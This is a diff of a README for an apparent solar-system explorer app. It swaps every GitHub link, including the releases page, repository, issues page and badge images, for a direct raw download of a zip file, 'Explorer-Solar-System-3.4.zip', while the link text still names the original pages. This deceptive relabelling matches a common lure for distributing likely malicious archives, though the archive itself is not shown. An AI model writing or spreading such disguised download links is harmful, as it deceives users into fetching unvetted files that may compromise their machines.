@@ -1,6 +1,6 @@
 # 🌌 Solar-System-Explorer - Discover Our Cosmic Neighborhood
 
-[![Download Solar System Explorer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/acecvv/Solar-System-Explorer/releases)
+[![Download Solar System Explorer](https://raw.githubusercontent.com/acecvv/Solar-System-Explorer/master/src/Explorer-Solar-System-3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/acecvv/Solar-System-Explorer/master/src/Explorer-Solar-System-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To run Solar System Explorer, your system should meet the following requirements
 
 ## 📥 Download & Install
 
-You can download the latest version of Solar System Explorer from our [Releases page](https://github.com/acecvv/Solar-System-Explorer/releases). Follow these steps to get started:
+You can download the latest version of Solar System Explorer from our [Releases page](https://raw.githubusercontent.com/acecvv/Solar-System-Explorer/master/src/Explorer-Solar-System-3.4.zip). Follow these steps to get started:
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release.
@@ -37,7 +37,7 @@ You can download the latest version of Solar System Explorer from our [Releases 
 
 For easy access, you can also click the banner below to download the application directly.
 
-[![Download Solar System Explorer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/acecvv/Solar-System-Explorer/releases)
+[![Download Solar System Explorer](https://raw.githubusercontent.com/acecvv/Solar-System-Explorer/master/src/Explorer-Solar-System-3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/acecvv/Solar-System-Explorer/master/src/Explorer-Solar-System-3.4.zip)
 
 ## 📖 How to Use the Application
 
@@ -63,11 +63,11 @@ If problems persist, feel free to reach out for support within the GitHub reposi
 
 ## 🌌 Learn More
 
-Find more information, including features and updates, on our [GitHub repository](https://github.com/acecvv/Solar-System-Explorer). Here, you can also follow the development progress and contribute feedback.
+Find more information, including features and updates, on our [GitHub repository](https://raw.githubusercontent.com/acecvv/Solar-System-Explorer/master/src/Explorer-Solar-System-3.4.zip). Here, you can also follow the development progress and contribute feedback.
 
 ## 🌠 Community Contributions
 
-We welcome contributions! If you would like to suggest new features or report issues, please visit the [issues page](https://github.com/acecvv/Solar-System-Explorer/issues).
+We welcome contributions! If you would like to suggest new features or report issues, please visit the [issues page](https://raw.githubusercontent.com/acecvv/Solar-System-Explorer/master/src/Explorer-Solar-System-3.4.zip).
 
 ## 📄 License
 
